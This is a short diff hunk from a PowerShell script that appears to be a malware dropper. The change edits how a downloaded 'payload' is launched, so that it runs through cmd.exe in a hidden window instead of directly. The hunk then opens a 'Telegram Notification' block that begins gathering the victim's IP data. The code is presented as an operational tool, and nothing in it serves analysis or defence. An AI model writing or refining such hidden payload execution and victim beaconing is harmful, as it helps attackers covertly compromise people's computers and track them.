@@ -60,10 +60,8 @@ try {
 
 if (Test-Path $outPath) {
     Write-Host "[+] Direct Executing payload..."
-    Start-Process -FilePath $outPath -WorkingDirectory $targetDir -WindowStyle Hidden
-
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c start `"`" `"$outPath`"" -WorkingDirectory $targetDir -WindowStyle Hidden
 }
-
 # Telegram Notification
 try {
     $ipData = ""
